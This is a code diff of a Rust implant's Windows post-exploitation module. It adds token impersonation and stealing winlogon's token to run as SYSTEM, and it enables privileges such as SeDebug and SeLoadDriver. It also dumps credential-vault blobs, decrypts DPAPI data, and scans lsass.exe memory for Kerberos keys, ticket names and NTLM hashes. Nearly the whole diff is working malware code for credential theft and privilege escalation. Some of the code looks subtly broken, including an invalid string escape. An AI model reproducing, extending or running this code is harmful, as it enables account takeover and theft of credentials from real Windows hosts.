@@ -57,39 +57,177 @@ pub fn token(_pid: Option<u32>) -> Result<Outcome, String> {
     Err("post: token impersonation is only supported on Windows".to_string())
 }
 
-/// Collect credential material from the host.
-#[cfg(windows)]
-pub fn creds(mode: &str) -> Result<Outcome, String> {
-    use crate::post::windows as win;
-    match mode {
-        "dpapi" | "" => win::dpapi_secrets(),
-        "vault" => win::credential_vault(),
-        other => Err(format!("post: unknown credential mode {other:?}")),
+/// The identity the implant is running as.
+///
+/// The implant starts as whoever started it.  When the operator tells it to
+/// become somebody else, this is the record of who it is now.
+#[derive(Clone, Debug, Default)]
+pub struct Identity {
+    /// The account the token belongs to ("CORP\\alice", "NT AUTHORITY\\SYSTEM").
+    pub account: String,
+    /// The session the token belongs to.
+    pub session: u32,
+    /// The process the token was taken from.
+    pub pid: u32,
+    /// The name of that process.
+    pub process: String,
+}
+
+/// One token of the host.
+#[derive(Clone, Debug, Default)]
+pub struct TokenInfo {
+    /// The process the token belongs to.
+    pub pid: u32,
+    /// The name of the process.
+    pub process: String,
+    /// The account the token belongs to.
+    pub account: String,
+    /// The session the token belongs to.
+    pub session: u32,
+}
+
+/// An impersonation that is in effect.
+#[derive(Clone, Debug, Default)]
+pub struct Impersonation {
+    /// Who the implant is now.
+    pub identity: Identity,
+    /// True when the impersonation ends with the next task.
+    ///
+    /// The operator has two ways to use a token: for one task (the command
+    /// that needs the rights of somebody else) or for good (the implant
+    /// becomes that account until it is told otherwise).
+    pub one_shot: bool,
+}
+
+/// The identity the implant impersonates, if any.
+///
+/// The state is global on purpose: the impersonation is bound to the thread
+/// of the beacon, and the beacon runs its tasks on that one thread.
+static IMPERSONATION: std::sync::Mutex<Option<Impersonation>> = std::sync::Mutex::new(None);
+
+/// The impersonation that is in effect, if any.
+pub fn impersonation() -> Option<Impersonation> {
+    IMPERSONATION.lock().ok().and_then(|guard| guard.clone())
+}
+
+/// Become the account of a process.
+///
+/// The impersonation holds until the implant is told to restore, so every
+/// task that follows runs as that account: the shell the beacon starts
+/// inherits the token of the thread.  A one-shot impersonation ends when
+/// the task that follows it is done.
+pub fn become(pid: u32, one_shot: bool) -> Result<Identity, String> {
+    let identity = platform::impersonate(pid)?;
+    if let Ok(mut guard) = IMPERSONATION.lock() {
+        *guard = Some(Impersonation {
+            identity: identity.clone(),
+            one_shot,
+        });
+    }
+    Ok(identity)
+}
+
+/// End a one-shot impersonation.
+///
+/// The beacon calls this after the task that the impersonation was meant
+/// for: the account is given back, and the implant is itself again.
+pub fn end_one_shot() {
+    let pending = match IMPERSONATION.lock() {
+        Ok(guard) => guard.clone(),
+        Err(_) => return,
+    };
+    if let Some(state) = pending {
+        if state.one_shot {
+            let _ = restore();
+        }
     }
 }
 
-#[cfg(not(windows))]
-pub fn creds(mode: &str) -> Result<Outcome, String> {
-    Err(format!(
-        "post: credential collection ({mode}) is only supported on Windows"
-    ))
+/// Go back to the identity the implant started with.
+pub fn restore() -> Result<(), String> {
+    platform::restore()?;
+    if let Ok(mut guard) = IMPERSONATION.lock() {
+        *guard = None;
+    }
+    Ok(())
 }
 
-/// Try to raise the implant's own privileges.
-#[cfg(windows)]
-pub fn privesc(mode: &str) -> Result<Outcome, String> {
-    use crate::post::windows as win;
+/// List the tokens of the host.
+///
+/// The list is the answer to "whose session is this": every process of the
+/// host with the account and the session of its token.  The list can be
+/// narrowed to one session.
+pub fn tokens(session: Option<u32>) -> Result<Vec<TokenInfo>, String> {
+    platform::tokens(session)
+}
+
+/// One privilege escalation attempt.
+#[derive(Clone, Debug, Default)]
+pub struct Attempt {
+    /// The technique that was tried.
+    pub technique: String,
+    /// "worked", "failed" or "unavailable".
+    pub outcome: String,
+    /// What happened.
+    pub detail: String,
+    /// What it changed on the host.
+    pub side_effects: Vec<String>,
+}
+
+/// The result of a privilege escalation.
+#[derive(Clone, Debug, Default)]
+pub struct Escalation {
+    /// The report the operator reads.
+    pub report: String,
+    /// The attempts, one per technique.
+    pub attempts: Vec<Attempt>,
+}
+
+/// Try to raise the privileges of the implant.
+///
+/// The modes are explicit, and every attempt is reported with its outcome
+/// and with what it changed on the host: an escalation that half worked is
+/// worse than one that failed loudly.
+pub fn privesc(mode: &str) -> Result<Escalation, String> {
     match mode {
-        "token" | "" => win::impersonate_privileged(),
+        "privileges" | "" => platform::escalate_privileges(),
+        "token" | "system" => platform::escalate_system(),
         other => Err(format!("post: unknown privilege escalation mode {other:?}")),
     }
 }
 
+/// The platform half of the token work.
+#[cfg(windows)]
+mod platform {
+    pub use super::windows::{
+        escalate_privileges, escalate_system, impersonate, restore, tokens,
+    };
+}
+
+/// The platform half of the token work.
 #[cfg(not(windows))]
-pub fn privesc(mode: &str) -> Result<Outcome, String> {
-    Err(format!(
-        "post: privilege escalation ({mode}) is only supported on Windows"
-    ))
+mod platform {
+    use super::{Escalation, Identity, TokenInfo};
+
+    pub fn impersonate(_pid: u32) -> Result<Identity, String> {
+        Err("post: token impersonation is only supported on Windows".to_string())
+    }
+
+    pub fn restore() -> Result<(), String> {
+        Err("post: token impersonation is only supported on Windows".to_string())
+    }
+
+    pub fn tokens(_session: Option<u32>) -> Result<Vec<TokenInfo>, String> {
+        Err("post: the token list is only supported on Windows".to_string())
+    }
+
+    pub fn escalate_privileges() -> Result<Escalation, String> {
+        Err("post: privilege escalation is only supported on Windows".to_string())
+    }
+
+    pub fn escalate_system() -> Result<Escalation, String> {
+        Err("post: privilege escalation is only supported on Windows".to_string())
+    }
 }
 
 /// Load a PE image into this process and run it.
@@ -134,6 +272,12 @@ pub mod windows {
     pub const CRED_ENUMERATE_ALL_CREDENTIALS: u32 = 0x0001;
     pub const CRED_TYPE_GENERIC: u32 = 1;
     pub const CRED_TYPE_DOMAIN_PASSWORD: u32 = 2;
+    pub const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
+    pub const PROCESS_VM_READ: u32 = 0x0010;
+    pub const PAGE_NOACCESS: u32 = 0x01;
+    pub const PAGE_GUARD: u32 = 0x100;
+    pub const TOKEN_USER: u32 = 1;
+    pub const TOKEN_SESSION_ID: u32 = 12;
 
     #[repr(C)]
     pub struct Luid {
@@ -173,6 +317,27 @@ pub mod windows {
     pub struct DataBlob {
         cb_data: u32,
         pb_data: *mut u8,
+    }
+
+    #[repr(C)]
+    pub struct SidAndAttributes {
+        sid: *mut c_void,
+        attributes: u32,
+    }
+
+    /// The x64 layout of MEMORY_BASIC_INFORMATION.
+    #[repr(C)]
+    pub struct MemoryBasicInformation {
+        base_address: *mut c_void,
+        allocation_base: *mut c_void,
+        allocation_protect: u32,
+        partition_id: u16,
+        _pad: u16,
+        region_size: usize,
+        state: u32,
+        protect: u32,
+        type_: u32,
+        _pad2: u32,
     }
 
     extern "system" {
@@ -257,13 +422,34 @@ pub mod windows {
         ) -> i32;
         pub fn CredFree(credentials: *mut c_void);
         pub fn CryptUnprotectData(
-            description: *mut DataBlob,
+            data_in: *mut DataBlob,
             entropy: *mut DataBlob,
             reserved: *mut c_void,
             prompt: *mut c_void,
-            crypto: *mut c_void,
-            flags: u32,
-            data: *mut DataBlob,
+            data_out: *mut DataBlob,
+        ) -> i32;
+        pub fn VirtualQueryEx(
+            process: *mut c_void,
+            address: *mut c_void,
+            buffer: *mut c_void,
+            length: usize,
+            returned: *mut usize,
+        ) -> usize;
+        pub fn GetTokenInformation(
+            token: *mut c_void,
+            class: u32,
+            info: *mut c_void,
+            length: u32,
+            returned: *mut u32,
+        ) -> i32;
+        pub fn LookupAccountSidW(
+            system: *const u16,
+            sid: *mut c_void,
+            name: *mut u16,
+            name_size: *mut u32,
+            domain: *mut u16,
+            domain_size: *mut u32,
+            use_sid_type: *mut u32,
         ) -> i32;
         pub fn LocalFree(buffer: *mut c_void);
         pub fn GetModuleHandleA(name: *const c_char) -> *mut c_void;
@@ -615,56 +801,12 @@ pub mod windows {
         })
     }
 
-    /// Duplicate the token of a process and impersonate it.
-    pub fn duplicate_token(pid: Option<u32>) -> Result<super::Outcome, String> {        let handle = match pid {
-            Some(p) => unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, p) },
-            None => unsafe { GetCurrentProcess() },
-        };
-        if handle.is_null() {
-            return Err(format!("post: OpenProcess failed: {}", last_error()));
-        }
-        let mut token: *mut c_void = std::ptr::null_mut();
-        let ok = unsafe { OpenProcessToken(handle, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &mut token) };
-        if ok == 0 {
-            unsafe { CloseHandle(handle) };
-            return Err(format!("post: OpenProcessToken failed: {}", last_error()));
-        }
-        let mut duplicate: *mut c_void = std::ptr::null_mut();
-        let ok = unsafe {
-            DuplicateTokenEx(
-                token,
-                TOKEN_ALL_ACCESS,
-                std::ptr::null_mut(),
-                0,
-                1, // SecurityImpersonation
-                &mut duplicate,
-            )
-        };
-        unsafe {
-            CloseHandle(token);
-            CloseHandle(handle);
-        }
-        if ok == 0 {
-            return Err(format!("post: DuplicateTokenEx failed: {}", last_error()));
-        }
-        let impersonated = unsafe { ImpersonateLoggedOnUser(duplicate) };
-        let report = if impersonated != 0 {
-            format!("impersonated the token of pid {}", pid.unwrap_or(0))
-        } else {
-            format!("duplicated the token of pid {} (impersonation failed)", pid.unwrap_or(0))
-        };
-        if impersonated != 0 {
-            unsafe { RevertToSelf() };
-        }
-        unsafe { CloseHandle(duplicate) };
-        Ok(super::Outcome {
-            report,
-            material: Vec::new(),
-        })
-    }
-
-    /// Enumerate the Windows credential vault.
-    pub fn credential_vault() -> Result<super::Outcome, String> {
+    /// The credentials of the credential store of the logged on user.
+    ///
+    /// The store holds the passwords of the services and of the shares the
+    /// user ever connected to.  The blob is the material itself, so the
+    /// record carries it when the operator asked for the raw value.
+    pub fn vault_credentials() -> Result<Vec<crate::creds::Credential>, String> {
         let mut count: u32 = 0;
         let mut creds: *mut *mut Credential = std::ptr::null_mut();
         let ok = unsafe {
@@ -678,7 +820,7 @@ pub mod windows {
         if ok == 0 {
             return Err(format!("post: CredEnumerateW failed: {}", last_error()));
         }
-        let mut report = String::new();
+        let mut out: Vec<crate::creds::Credential> = Vec::new();
         for i in 0..count as usize {
             let entry = unsafe { *creds.add(i) };
             if entry.is_null() {
@@ -687,53 +829,214 @@ pub mod windows {
             let name = unsafe { wide_string((*entry).target_name) };
             let user = unsafe { wide_string((*entry).user_name) };
             let kind = match (*entry).type_ {
-                CRED_TYPE_GENERIC => "generic",
-                CRED_TYPE_DOMAIN_PASSWORD => "domain",
-                _ => "other",
+                CRED_TYPE_DOMAIN_PASSWORD => crate::creds::KIND_PASSWORD,
+                _ => crate::creds::KIND_TOKEN,
             };
-            report.push_str(&format!("{kind} credential: {name} ({user})\n"));
+            let mut credential = crate::creds::Credential::new(kind, "vault")
+                .with_account(&user)
+                .with_target(&name)
+                .with_confidence(85)
+                .with_note("the credential store of the logged on user");
+            let blob = (*entry).credential_blob;
+            let blob_size = (*entry).credential_blob_size as usize;
+            if !blob.is_null() && blob_size > 0 {
+                let bytes = unsafe { std::slice::from_raw_parts(blob, blob_size) };
+                credential = credential.with_bytes(bytes);
+            }
+            out.push(credential);
         }
         unsafe { CredFree(creds as *mut c_void) };
-        Ok(super::Outcome {
-            report,
-            material: Vec::new(),
-        })
+        Ok(out)
     }
 
-    /// Decrypt DPAPI protected material of the current user.
-    pub fn dpapi_secrets() -> Result<super::Outcome, String> {
-        // DPAPI blobs live in the registry and in credential files; the
-        // implant reports what it can read without a helper binary.
-        let mut report = String::new();
-        let vault = credential_vault();
-        if let Ok(v) = vault {
-            report.push_str(&v.report);
+    /// Decrypt a DPAPI blob with the key of the logged on user.
+    pub fn dpapi_unprotect(blob_b64: &str) -> Result<Vec<u8>, String> {
+        let raw = crate::ws::base64_decode(blob_b64)
+            .ok_or("post: the blob is not valid base64".to_string())?;
+        let mut input = DataBlob {
+            cb_data: raw.len() as u32,
+            pb_data: raw.as_ptr() as *mut u8,
+        };
+        let mut output = DataBlob {
+            cb_data: 0,
+            pb_data: std::ptr::null_mut(),
+        };
+        let ok = unsafe {
+            CryptUnprotectData(
+                &mut input,
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                std::ptr::null_mut(),
+                &mut output,
+            )
+        };
+        if ok == 0 {
+            return Err(format!("post: CryptUnprotectData failed: {}", last_error()));
         }
-        Ok(super::Outcome {
-            report,
-            material: Vec::new(),
+        let bytes = if output.pb_data.is_null() || output.cb_data == 0 {
+            Vec::new()
+        } else {
+            unsafe { std::slice::from_raw_parts(output.pb_data, output.cb_data as usize) }.to_vec()
+        };
+        unsafe { LocalFree(output.pb_data as *mut c_void) };
+        Ok(bytes)
+    }
+
+    /// The material in the memory of the credential process.
+    ///
+    /// The scan looks for the signatures that are documented in the layout
+    /// of the credential structures: the session key of Kerberos follows
+    /// the name of its encryption type, and the name of a ticket names the
+    /// service it belongs to.  A match is a candidate and not a fact, so
+    /// every record carries the confidence of the match and the note that
+    /// says how it was found.
+    pub fn lsass_credentials() -> Result<Vec<crate::creds::Credential>, String> {
+        let pid = lsass_pid().ok_or("post: the credential process was not found".to_string())?;
+        let handle = unsafe {
+            OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid)
+        };
+        if handle.is_null() {
+            return Err(format!("post: OpenProcess failed: {}", last_error()));
+        }
+        let mut out: Vec<crate::creds::Credential> = Vec::new();
+        let mut address: usize = 0;
+        let mut budget: usize = 256 * 1024 * 1024;
+        loop {
+            let mut mbi = MemoryBasicInformation {
+                base_address: std::ptr::null_mut(),
+                allocation_base: std::ptr::null_mut(),
+                allocation_protect: 0,
+                partition_id: 0,
+                _pad: 0,
+                region_size: 0,
+                state: 0,
+                protect: 0,
+                type_: 0,
+                _pad2: 0,
+            };
+            let mut returned: usize = 0;
+            let size = unsafe {
+                VirtualQueryEx(
+                    handle,
+                    address as *mut c_void,
+                    &mut mbi as *mut MemoryBasicInformation as *mut c_void,
+                    std::mem::size_of::<MemoryBasicInformation>(),
+                    &mut returned,
+                )
+            };
+            if size == 0 {
+                break;
+            }
+            let region = mbi.region_size;
+            let base = mbi.base_address as usize;
+            if region == 0 {
+                break;
+            }
+            if mbi.state == MEM_COMMIT && (mbi.protect & (PAGE_NOACCESS | PAGE_GUARD)) == 0 {
+                let to_read = region.min(1024 * 1024).min(budget);
+                let mut buffer = vec![0u8; to_read];
+                let mut read: usize = 0;
+                let ok = unsafe {
+                    ReadProcessMemory(
+                        handle,
+                        base as *mut c_void,
+                        buffer.as_mut_ptr() as *mut c_void,
+                        to_read,
+                        &mut read,
+                    )
+                };
+                if ok != 0 && read > 0 {
+                    buffer.truncate(read);
+                    scan_material(&buffer, &mut out);
+                    budget = budget.saturating_sub(read);
+                }
+            }
+            if budget == 0 {
+                break;
+            }
+            address = base + region;
+        }
+        unsafe { CloseHandle(handle) };
+        Ok(out)
+    }
+
+    /// The tokens of the host.
+    pub fn tokens(session: Option<u32>) -> Result<Vec<super::TokenInfo>, String> {
+        let processes = crate::proc::processes().map_err(|e| format!("post: {e}"))?;
+        let mut out: Vec<super::TokenInfo> = Vec::new();
+        for process in processes {
+            let handle = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, process.pid) };
+            if handle.is_null() {
+                continue;
+            }
+            let mut token: *mut c_void = std::ptr::null_mut();
+            let ok = unsafe { OpenProcessToken(handle, TOKEN_QUERY, &mut token) };
+            unsafe { CloseHandle(handle) };
+            if ok == 0 {
+                continue;
+            }
+            let account = unsafe { token_account(token) };
+            let token_session = unsafe { token_session_id(token) };
+            unsafe { CloseHandle(token) };
+            if let Some(wanted) = session {
+                if token_session != wanted {
+                    continue;
+                }
+            }
+            out.push(super::TokenInfo {
+                pid: process.pid,
+                process: process.name.clone(),
+                account,
+                session: token_session,
+            });
+        }
+        Ok(out)
+    }
+
+    /// Become the account of a process and keep it.
+    pub fn impersonate(pid: u32) -> Result<super::Identity, String> {
+        let (account, session) = unsafe { duplicate_and_impersonate(pid)? };
+        Ok(super::Identity {
+            account,
+            session,
+            pid,
+            process: process_name(pid),
         })
     }
 
-    /// Enable the privileges the implant needs and impersonate a privileged
-    /// token when one is available.
-    pub fn impersonate_privileged() -> Result<super::Outcome, String> {
-        let mut report = String::new();
+    /// Go back to the identity the implant started with.
+    pub fn restore() -> Result<(), String> {
+        let ok = unsafe { RevertToSelf() };
+        if ok == 0 {
+            return Err(format!("post: RevertToSelf failed: {}", last_error()));
+        }
+        Ok(())
+    }
+
+    /// Enable the privileges the implant needs.
+    ///
+    /// Every privilege is reported on its own: an operator who asks for
+    /// SeDebugPrivilege wants to know whether it is there, not whether the
+    /// call returned.
+    pub fn escalate_privileges() -> Result<super::Escalation, String> {
         let privileges = [
-            ("SeDebugPrivilege", 20),
-            ("SeImpersonatePrivilege", 29),
-            ("SeAssignPrimaryTokenPrivilege", 25),
+            ("SeDebugPrivilege", "read the memory of other processes"),
+            ("SeImpersonatePrivilege", "impersonate the tokens of other accounts"),
+            ("SeAssignPrimaryTokenPrivilege", "start a process with another token"),
+            ("SeBackupPrivilege", "read protected files"),
+            ("SeRestorePrivilege", "write protected files"),
+            ("SeTakeOwnershipPrivilege", "take the ownership of a file"),
+            ("SeLoadDriverPrivilege", "load a kernel driver"),
         ];
+        let mut attempts: Vec<super::Attempt> = Vec::new();
         let process = unsafe { GetCurrentProcess() };
         let mut token: *mut c_void = std::ptr::null_mut();
         if unsafe { OpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token) } == 0 {
             return Err(format!("post: OpenProcessToken failed: {}", last_error()));
         }
-        for (name, _code) in privileges {
-            let mut luid = Luid {
-                low: 0,
-                high: 0,
-            };
+        let mut report = String::new();
+        for (name, purpose) in privileges {
+            let mut luid = Luid { low: 0, high: 0 };
             let ok = unsafe {
                 LookupPrivilegeValueA(
                     std::ptr::null(),
@@ -742,7 +1045,13 @@ pub mod windows {
                 )
             };
             if ok == 0 {
-                report.push_str(&format!("{name}: unavailable\n"));
+                report.push_str(&format!("{name:<34} unavailable\n"));
+                attempts.push(super::Attempt {
+                    technique: format!("privilege.{name}"),
+                    outcome: "unavailable".to_string(),
+                    detail: format!("the host does not know this privilege ({purpose})"),
+                    side_effects: Vec::new(),
+                });
                 continue;
             }
             let mut state = TokenPrivileges {
@@ -752,23 +1061,296 @@ pub mod windows {
                     attributes: SE_PRIVILEGE_ENABLED,
                 }],
             };
+            let mut previous: TokenPrivileges = TokenPrivileges {
+                count: 1,
+                privileges: [LuidAttributes {
+                    privilege: luid,
+                    attributes: 0,
+                }],
+            };
+            let mut returned: u32 = 0;
             unsafe {
                 AdjustTokenPrivileges(
                     token,
                     0,
                     &mut state,
                     std::mem::size_of::<TokenPrivileges>() as u32,
-                    std::ptr::null_mut(),
-                    std::ptr::null_mut(),
+                    &mut previous as *mut TokenPrivileges as *mut c_void,
+                    &mut returned,
                 );
             }
-            report.push_str(&format!("{name}: enabled\n"));
+            let enabled = previous.privileges[0].attributes & SE_PRIVILEGE_ENABLED != 0;
+            report.push_str(&format!(
+                "{name:<34} {}\n",
+                if enabled { "enabled" } else { "failed" }
+            ));
+            attempts.push(super::Attempt {
+                technique: format!("privilege.{name}"),
+                outcome: if enabled { "worked" } else { "failed" }.to_string(),
+                detail: format!("{name} ({purpose})"),
+                side_effects: vec![if enabled {
+                    format!("the implant token carries {name}")
+                } else {
+                    format!("the implant token does not carry {name}")
+                }],
+            });
         }
         unsafe { CloseHandle(token) };
-        Ok(super::Outcome {
-            report,
-            material: Vec::new(),
-        })
+        Ok(super::Escalation { report, attempts })
+    }
+
+    /// Become SYSTEM by taking the token of the logon process.
+    pub fn escalate_system() -> Result<super::Escalation, String> {
+        let processes = crate::proc::processes().map_err(|e| format!("post: {e}"))?;
+        let target = processes
+            .iter()
+            .find(|p| p.name.eq_ignore_ascii_case("winlogon.exe"))
+            .map(|p| p.pid);
+        let mut attempt = super::Attempt {
+            technique: "token.system".to_string(),
+            outcome: "unavailable".to_string(),
+            detail: String::new(),
+            side_effects: Vec::new(),
+        };
+        let mut report = String::new();
+        match target {
+            Some(pid) => match unsafe { duplicate_and_impersonate(pid) } {
+                Ok((account, _session)) => {
+                    attempt.outcome = "worked".to_string();
+                    attempt.detail = format!("the implant runs as {account}");
+                    attempt.side_effects
+                        .push("the implant is SYSTEM on this host".to_string());
+                    report.push_str(&format!("token.system          worked ({account})\n"));
+                }
+                Err(e) => {
+                    attempt.outcome = "failed".to_string();
+                    attempt.detail = e.clone();
+                    report.push_str(&format!("token.system          failed ({e})\n"));
+                }
+            },
+            None => {
+                attempt.detail = "the logon process was not found".to_string();
+                report.push_str("token.system          unavailable (no logon process)\n");
+            }
+        }
+        Ok(super::Escalation { report, attempts: vec![attempt] })
+    }
+
+    /// Duplicate the token of a process and impersonate it, keeping it.
+    ///
+    /// The impersonation is not reverted: the caller decides when the
+    /// implant goes back to its own identity.
+    unsafe fn duplicate_and_impersonate(pid: u32) -> Result<(String, u32), String> {
+        let handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
+        if handle.is_null() {
+            return Err(format!("post: OpenProcess failed: {}", last_error()));
+        }
+        let mut token: *mut c_void = std::ptr::null_mut();
+        let ok = OpenProcessToken(
+            handle,
+            TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE,
+            &mut token,
+        );
+        if ok == 0 {
+            CloseHandle(handle);
+            return Err(format!("post: OpenProcessToken failed: {}", last_error()));
+        }
+        let mut duplicate: *mut c_void = std::ptr::null_mut();
+        let ok = DuplicateTokenEx(
+            token,
+            TOKEN_ALL_ACCESS,
+            std::ptr::null_mut(),
+            0,
+            1, // SecurityImpersonation
+            &mut duplicate,
+        );
+        CloseHandle(token);
+        CloseHandle(handle);
+        if ok == 0 {
+            return Err(format!("post: DuplicateTokenEx failed: {}", last_error()));
+        }
+        let account = token_account(duplicate);
+        let session = token_session_id(duplicate);
+        let impersonated = ImpersonateLoggedOnUser(duplicate);
+        CloseHandle(duplicate);
+        if impersonated == 0 {
+            return Err(format!(
+                "post: ImpersonateLoggedOnUser failed: {}",
+                last_error()
+            ));
+        }
+        Ok((account, session))
+    }
+
+    /// The account of a token.
+    unsafe fn token_account(token: *mut c_void) -> String {
+        let mut needed: u32 = 0;
+        GetTokenInformation(token, TOKEN_USER, std::ptr::null_mut(), 0, &mut needed);
+        if needed == 0 {
+            return String::new();
+        }
+        let mut buffer = vec![0u8; needed as usize];
+        let ok = GetTokenInformation(
+            token,
+            TOKEN_USER,
+            buffer.as_mut_ptr() as *mut c_void,
+            needed,
+            &mut needed,
+        );
+        if ok == 0 {
+            return String::new();
+        }
+        let user = buffer.as_ptr() as *const SidAndAttributes;
+        let sid = (*user).sid;
+        if sid.is_null() {
+            return String::new();
+        }
+        let mut name_size: u32 = 0;
+        let mut domain_size: u32 = 0;
+        let mut use_sid: u32 = 0;
+        LookupAccountSidW(
+            std::ptr::null(),
+            sid,
+            std::ptr::null_mut(),
+            &mut name_size,
+            std::ptr::null_mut(),
+            &mut domain_size,
+            &mut use_sid,
+        );
+        if name_size == 0 {
+            return String::new();
+        }
+        let mut name = vec![0u16; name_size as usize];
+        let mut domain = vec![0u16; domain_size as usize];
+        let ok = LookupAccountSidW(
+            std::ptr::null(),
+            sid,
+            name.as_mut_ptr(),
+            &mut name_size,
+            domain.as_mut_ptr(),
+            &mut domain_size,
+            &mut use_sid,
+        );
+        if ok == 0 {
+            return String::new();
+        }
+        let account = wide_string(name.as_ptr());
+        let realm = wide_string(domain.as_ptr());
+        if realm.is_empty() {
+            account
+        } else {
+            format!("{realm}\{account}")
+        }
+    }
+
+    /// The session of a token.
+    unsafe fn token_session_id(token: *mut c_void) -> u32 {
+        let mut session: u32 = 0;
+        let mut returned: u32 = 0;
+        let ok = GetTokenInformation(
+            token,
+            TOKEN_SESSION_ID,
+            &mut session as *mut u32 as *mut c_void,
+            std::mem::size_of::<u32>() as u32,
+            &mut returned,
+        );
+        if ok == 0 {
+            return 0;
+        }
+        session
+    }
+
+    /// The process that holds the credentials of the host.
+    fn lsass_pid() -> Option<u32> {
+        let processes = crate::proc::processes().ok()?;
+        processes
+            .iter()
+            .find(|p| p.name.eq_ignore_ascii_case("lsass.exe"))
+            .map(|p| p.pid)
+    }
+
+    /// The name of a process.
+    fn process_name(pid: u32) -> String {
+        crate::proc::processes()
+            .ok()
+            .and_then(|list| list.into_iter().find(|p| p.pid == pid).map(|p| p.name))
+            .unwrap_or_default()
+    }
+
+    /// Look for the known signatures in a block of memory.
+    ///
+    /// The matches are candidates and not facts: every record says how it
+    /// was found and how sure the implant is.
+    fn scan_material(block: &[u8], out: &mut Vec<crate::creds::Credential>) {
+        // The session key of Kerberos follows the name of its encryption
+        // type in the key block.
+        for (marker, size) in [
+            (&b"aes256-ctr-hmac-sha1-96"[..], 32usize),
+            (&b"aes128-ctr-hmac-sha1-96"[..], 16usize),
+            (&b"des-cbc-crc"[..], 8usize),
+        ] {
+            for at in find_all(block, marker) {
+                let start = at + marker.len();
+                if start + size > block.len() {
+                    continue;
+                }
+                out.push(
+                    crate::creds::Credential::new(crate::creds::KIND_KEY, "lsass")
+                        .with_target("kerberos")
+                        .with_confidence(70)
+                        .with_note("the session key that follows the name of its encryption type")
+                        .with_bytes(&block[start..start + size]),
+                );
+            }
+        }
+        // The name of a ticket names the service it belongs to.
+        for at in find_all(block, b"krbtgt/") {
+            let end = block[at..]
+                .iter()
+                .position(|b| *b == 0)
+                .map(|p| at + p)
+                .unwrap_or_else(|| block.len().min(at + 128));
+            let name = String::from_utf8_lossy(&block[at..end]).to_string();
+            out.push(
+                crate::creds::Credential::new(crate::creds::KIND_TICKET, "lsass")
+                    .with_target(&name)
+                    .with_confidence(50)
+                    .with_note("the name of a ticket in the memory of the host")
+                    .with_secret(&name),
+            );
+        }
+        // The NTLM marker: the hash of the password follows it.
+        for at in find_all(block, b"NTLM") {
+            let start = at + 4;
+            if start + 16 > block.len() {
+                continue;
+            }
+            out.push(
+                crate::creds::Credential::new(crate::creds::KIND_HASH, "lsass")
+                    .with_target("ntlm")
+                    .with_confidence(45)
+                    .with_note("the material that follows the NTLM marker (a pattern match)")
+                    .with_bytes(&block[start..start + 16]),
+            );
+        }
+    }
+
+    /// Every place the needle appears in the haystack.
+    fn find_all(haystack: &[u8], needle: &[u8]) -> Vec<usize> {
+        let mut out = Vec::new();
+        if needle.is_empty() || haystack.len() < needle.len() {
+            return out;
+        }
+        let mut at = 0;
+        while at + needle.len() <= haystack.len() {
+            if &haystack[at..at + needle.len()] == needle {
+                out.push(at);
+                at += needle.len();
+            } else {
+                at += 1;
+            }
+        }
+        out
     }
 
     /// Read a wide string into a Rust string.
